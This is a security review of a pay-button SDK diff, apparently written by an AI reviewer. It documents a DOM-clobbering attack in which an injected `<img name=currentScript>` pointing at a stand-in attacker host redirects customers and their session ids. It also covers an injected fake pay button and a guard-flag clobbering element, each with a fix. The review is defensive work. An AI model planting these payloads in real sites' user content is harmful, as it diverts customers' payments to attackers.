VERDICT: CHANGES

# Security review: 007-P4-sdk-button, round 1 (fast mode §3a)

Diff `c81b330..3e48d40` (packages/sdk/button.js, the copy at apps/web/public/v1/button.js, packages/sdk/index.ts, README, tests). `cmp` says the two button.js files are identical. `npm test` at 3e48d40: tests 39, pass 39, fail 0.

I checked the attack paths in real Chrome 156 (headless) with three local origins: shop :4500, gateway :4501 serving the real button.js, attacker :4502. The page clicks the shop's own `<button data-mc-session=ID>` once it has loaded. The stub, a fixed copy of button.js and the request log are in the reviewer's scratchpad (secprobe/), not in the repo.

## OPEN (blocks)

### HIGH-1: an `<img name="currentScript">` sends the shop's real pay button to an attacker's site
- **Where:** packages/sdk/button.js:5-7, and the same lines in apps/web/public/v1/button.js.
- **Exploit:**
  - Someone posts user content on the shop page (a review, a comment) containing `<img name="currentScript" src="https://evil.example/">`. It only has to be in the DOM before button.js runs.
  - `Document` is `[LegacyOverrideBuiltIns]`, so a named `<img>` (or `<embed>`) replaces `document.currentScript`.
  - `script.src` is then the attacker's URL and `origin` is `https://evil.example`. The single delegated listener is installed with that origin.
  - Every click on the shop's real `data-mc-session` / `data-mc-link` element now goes to `https://evil.example/checkout/<the real session id>`.
  - The attacker gets the real session id, so it can show the real amount on a copy of the checkout page and ask for the USDT transfer or signature itself.
  - No script runs, so a strict `script-src` CSP doesn't stop it.
  - This breaks the spec's own guarantee: "A page can't point the button at another site."
  - Webpack (CVE-2024-43788), Vite (CVE-2024-45812) and Rollup (CVE-2024-47068) had the same `currentScript` gadget.
  - DOMPurify's default `SANITIZE_DOM` strips `name="currentScript"`. Raw-HTML markdown and many other sanitizers don't.
- **Evidence (request log):**
  - Original file: `4502 GET /checkout/70359474-3587-4bc8-8eca-80eb35d5cbdc`. The customer lands on the attacker's origin with the real session id.
  - With the fix below and the same `<img>` on the page: `4501 GET /checkout/70359474-...`, the real gateway.
  - Baseline with no `<img>`: `4501 GET /checkout/...`.
- **Fix (two lines; verified in Chrome):**
  ```js
  var script = Object.getOwnPropertyDescriptor(Document.prototype, "currentScript").get.call(document);
  if (!(script instanceof HTMLScriptElement) || !script.src) return;
  ```
  - The prototype getter skips the named-element override.
  - The `instanceof` check alone also fails closed: with the `<img>` present, no listener is installed and nothing navigates.
  - Both changes push the file past the 2,048-byte limit (2,122 bytes as tested), so shorten the 3-line header comment.
  - Add a node:vm test: a fake `currentScript` that is an `<img>`-like element with a `src` → no navigation. The vm context needs `Document` and `HTMLScriptElement`.
  - Add one case to the CDP walk: a page with `<img name=currentScript src=//other>` → it lands on the stub gateway.
- **Owner:** claude-sdk.

## FOLLOW-UP (MEDIUM/LOW, fix in the next batch)

### MEDIUM-1: user content can draw a working pay button that pays the attacker's own merchant
- **Where:** button.js:22, the delegated `closest("[data-mc-session],[data-mc-link]")`. It handles any element anywhere on the page.
- **Exploit:**
  - Someone posts a `<span data-mc-session="ATTACKER_SESSION">Pay 25 USDT</span>` in a review. DOMPurify keeps `data-*` by default.
  - That span becomes a working pay button on the shop's page. It opens the real gateway's checkout for the attacker's session, so the customer pays the attacker's merchant.
  - The shop never credits it: the README matches the stored session id and amount.
  - It stays on the gateway origin and under `/checkout/`. An injected `<a href>` can do the same, but this also works where a sanitizer drops links and keeps `data-*`.
- **Fix:**
  - README: "strip `data-mc-session` / `data-mc-link` from user content", for example DOMPurify `FORBID_ATTR: ["data-mc-session","data-mc-link"]`.
  - The hosted checkout shows the merchant's name and the shop's domain prominently.
- **Owners:** claude-sdk (README), claude-frontend (checkout header).

### LOW-1: the guard flag can be clobbered or polluted, which leaves every pay button dead
- **Where:** button.js:19.
- **Exploit:** `<div id="__mcPayButton">` in user content (DOMPurify keeps this id), or `Object.prototype.__mcPayButton` set through a prototype-pollution bug in another library. Either way `window.__mcPayButton` is truthy, so the listener is never installed.
- **Evidence (Chrome):** no navigation with the `<div>` present. With `!== true`, the click lands on `4501 /checkout/...`.
- **Impact:** it fails closed and the customer is never sent anywhere wrong; the shop just has no working button.
- **Fix:** `if (window.__mcPayButton !== true)`, or key the flag on `Symbol.for("merchant-capital.pay-button")`. Same lines as HIGH-1, so fold it in.
- **Owner:** claude-sdk.

### LOW-2: one error path skips `#scrub`
- **Where:** packages/sdk/index.ts:162.
- **Problem:** the currency-mismatch `GatewayError` puts the server's `session.id` and `priced.currency` into its message without `#scrub`. A gateway or proxy that echoes the key into either field would put it in the shop's logs.
- **Why it matters:** the comment at :216 says "Every error message passes here". The server already holds the key, so this only affects logs.
- **Fix:** `throw new GatewayError(200, this.#scrub(...))`.
- **Owner:** claude-sdk.

### LOW-3: a bare `?` or `#` in baseUrl drops a path prefix (a bug, not a leak)
- **Where:** packages/sdk/index.ts:141-145.
- **Problem:** `https://h.test/gw?` passes, because `search` is `""` for a bare `?`. The join then calls `https://h.test/api/v1/sessions`, so `/gw` is lost.
- **Impact:** same host, so the key goes nowhere new.
- **Fix:** build the base from `base.origin + base.pathname`.
- **Owner:** claude-sdk.

## Checked, no finding
- **Destination:**
  - The URL is only `origin + "/checkout/" | "/l/" + [A-Za-z0-9_-]{1,64}`.
  - With no `u` flag, `\w` is ASCII only, and JS `$` doesn't match before a trailing `\n`. Checked in Node: `é`, `abc\n` and `ab.c` are all rejected.
  - So no `javascript:`, no `..`, `/`, `?`, `#` or `%`, and no other path is possible once the origin is the real script's.
- **Amount:**
  - The button never builds a query string, and `data-amount`, `data-currency` and `data-key` are never read (grep).
  - Nothing in the button can change the amount. The session or link decides it on the server.
- **Label:** `textContent` (button.js:38). The `setAttribute` value has already passed the regex, `cssText` is a constant, and there's no `innerHTML`. XSS-safe.
- **Shadow DOM:**
  - At the document listener, a click inside a shadow root reports the host as the target. `closest()` then only walks the light DOM, so a `data-mc-*` element inside the shadow root does nothing (Chrome: no navigation).
  - It fails closed and can't choose another destination. A host that carries the attribute itself still works. Worth a README line for web-component shops.
- **A second script with a different src:**
  - The browser sets `currentScript` to the script that is running, so it can't be spoofed without DOM clobbering (HIGH-1).
  - A second copy from another origin renders its own buttons, but the first copy's listener and origin win. Only an attacker who can inject a script could use this, and that attacker already controls the page.
- **Third-party scripts that run JS:** outside what the button can defend against. They can navigate the customer anyway.
- **No SRI:** the decision is accepted, as with Stripe.js. The button's integrity rests on the gateway host.
- **Requests and trackers:** button.js makes no requests and loads no third-party code. It holds no secrets and logs only a fixed message.
- **SDK follow-ups:**
  - **baseUrl:** every credential form I tried is refused: `user@`, `:pw@`, `%75@`, backslashes (`https:\\u:p@`), an embedded newline, `h.test@evil.test`, `h.test%2F@evil.test` and upper case. `https://@h` is accepted, but it has no credential and normalizes to `https://h/`.
  - **Scrubbing:** the network error and the server's `json.error` are scrubbed. The only miss is LOW-2. `err.cause` isn't attached, so undici details don't leak.
  - **orderId:** a non-string `orderId` is refused before any request (sdk.test.ts).
  - **Config errors:** a missing secret or a bad `toleranceSec` is now a plain `Error`. The README rethrows it as a 500, and the body is never acted on. An empty secret can't reach the HMAC.
- **Not in this diff:** contracts, the relayer, Arkiv, PII and the webhook HMAC logic (only the error class changed).

## Secrets grep
I ran `grep -nE '(PRIVATE_KEY|SECRET|0x[0-9a-fA-F]{64})'` on the 9 files in the diff:
- **Hits:**
  - env var names only: `GATEWAY_SECRET_KEY` and `GATEWAY_WEBHOOK_SECRET` in spec.md:45, README.md:28/39/66 and index.ts:209;
  - the made-up test constant `SECRET = "whsec-test-0123456789abcdef"` in sdk.test.ts:8, plus its uses.
- **No real secrets:** no 64-hex strings and no keys.
